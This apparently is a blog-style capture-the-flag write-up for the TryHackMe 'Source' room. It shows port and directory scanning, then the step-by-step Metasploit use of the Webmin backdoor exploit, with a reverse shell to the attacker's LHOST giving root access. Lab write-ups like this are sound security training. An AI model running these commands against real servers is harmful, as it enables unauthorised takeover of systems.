---
title: "Challenges: Source (TryHackMe)"
datePublished: Tue Aug 12 2025 02:07:27 GMT+0000 (Coordinated Universal Time)
cuid: cme7wiqic001f02kw5usz4bbj
slug: challenges-source-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1754964379873/72c7a618-cbd6-4949-8a29-57bc81627b3a.png
tags: exploit, tryhackme, websecurity, metasploit, ctf-writeup

---

In this engagement, the goal was to enumerate and compromise the attached machine to identify the root cause of a service disruption and gain full system control. The initial phase focused on reconnaissance, starting with network scanning and web directory enumeration. During this process, I discovered an open management interface on port 10000 running Webmin, which redirected to an AWS EC2 internal hostname. This finding hinted at a potential vulnerability in the Webmin service, making it a prime target for exploitation.

## Embark

Enumerate and root the box attached to this task. Can you discover the source of the disruption and leverage it to take control?

![](https://i.imgur.com/bgksoKQ.jpg align="left")

[*The Journey by Ekaterina on Dribbble*](https://dribbble.com/shots/3563205-Illustration-The-journey)

*This virtual machine is also included in the room* [*AttackerKB*](https://tryhackme.com/room/attackerkb) *as part of a guided experience. Additionally, you can download the OVA of Source for offline usage from* [*https://www.darkstar7471.com/resources.html*](https://www.darkstar7471.com/resources.html)  
  
Started off by enumerating the site:  
  
used nmap to check the open ports

`nmap -sV IP_Address`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1754962714052/1ff4b2f7-80a1-48be-bde1-744eab804d30.png align="center")

tried to use gobuster but it didn’t reveal anything also used gobuster at port 10000 which was open  
  
`gobuster dir -u IP_Address -w /usr/share/wordlists/dirb/common.txt`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1754963221959/d159a7d6-2c0f-4ead-817c-232cb1986f49.png align="center")

went ahead to check the site on `http://IP_Address:10000` and it show an option to redirect to a AWS EC2 instance DNS hostname. `ip-10-10-148-184.eu-west-1.compute.internal`  

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1754963287113/060c0c80-5539-4721-a7ba-aebcb79a0bff.png align="center")

redirecting the AWS EC2 instance shows this warning of potential Risk Ahead but we opt to Advance

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1754963516095/4919adef-4052-4536-bf12-186efed4caef.png align="center")

Advancing redericts us to a site called Webmin which requires login credentials but it’s likely to be available on exploit-db  

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1754963537145/44280f61-f5cd-4437-a17d-1b50530471a3.png align="center")

`searchsploit webmin 1.890`

---

Exploit Title | Path

---

Webmin &lt; 1.920 - 'rpc.cgi' Remote Code Execut | linux/webapps/47330.rb

---

Shellcodes: No Results  
  
  
went ahead to use metasploit:  
  
`msfconsole`  
  
`search webmin`  
  
found the 10th `exploit/linux/http/webmin_backdoor` likely what we needed

`use 10`  
  
`show options`  
  
`set RHOSTS TARGET_IP`

`set RPORT 10000`

`set SSL true`

`set LHOST ATTACK_MACHINE_IP`

`set LPORT 4444`

`set ForceExploit true`

`run`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1754963813568/87d42e29-561d-45cb-ba97-d712e5135cb5.png align="center")

when running the above: I had not set set SSL true and set RPORT 10000 once set and run, it will launch a command line within and it’s escalated to root user and you can find both the user and root flags.  

### Answer the questions below

1. user.txt  
      
    `find / -type f -name user.txt 2>/dev/null`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1754964090131/232ee35f-db1b-4f4f-a80d-2af73b067845.png align="center")
    
2. root.txt  
      
    `find / -type f -name root.txt 2>/dev/null`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1754964071510/c991cb9a-b73e-47b7-bbcf-8bcbb9ddac40.png align="center")
    
    Through systematic enumeration and targeted exploitation, I leveraged a known Webmin backdoor vulnerability to gain remote command execution on the target. Proper configuration of the exploit parameters allowed me to establish a shell with root privileges, granting full control over the system. Ultimately, I was able to retrieve both the user and root flags, confirming complete compromise of the host. This exercise underscores the importance of keeping administrative services patched and secured, as well as restricting access to critical management interfaces.